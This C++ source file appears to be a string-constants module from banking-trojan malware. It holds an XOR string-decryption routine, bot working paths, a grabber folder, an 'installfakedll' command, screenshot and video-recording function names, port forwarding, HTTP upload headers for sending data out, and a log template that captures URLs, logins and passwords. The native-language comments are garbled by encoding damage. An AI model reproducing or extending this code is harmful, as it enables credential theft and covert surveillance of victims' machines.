//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result = EncryptedStr;

	bool Encrypted = !Result.IsEmpty() && EncryptedStr > BeginCryptBlock &&
					 EncryptedStr < EndCryptBlock && EncryptedStr[0] != 'C' &&
					 BeginCryptBlock[0] != 'C';

	if (Encrypted)
	{
		// �������������� ������
		XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)Result.t_str(), Result.Length());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  ���� �������� ����������� �����.
//  ��� ������ ����������� ���� � �� �����������
//  CSEND
//  ����� ����������� ��������
//=============================================================================


CSSTR StrBotWorkPath[] = "WnsBMT"; // ������� ������� ����
CSSTR StrGrabberPath[] = "gdata";  // ��� ������� ����� �������

// ����� ��������� �����
CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // ���� �������� ��������


// �������� ������, ������� ����� �������� ���
CSSTR CommandInstallFakeDLL[] = "installfakedll";


// ����� ������, ��� ���������� � ���
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileInformation[] = "Info.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";


// ����� ������� ���������� �����������.
CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
CSSTR VideRecFuncStop[]           = "StopRec";
CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
CSSTR VideRecFuncSendData[]       = "StartSend";
CSSTR VideRecFuncRunPortForward[] = "RunPortForward";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";





// ������ ������ AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";
#endif


// ������ ������ BSS �������
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:    %s\r\n"
							 "Password: %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



//=============================================================================
// ����� ����� ����������� �����
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// �� ����������� ������
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
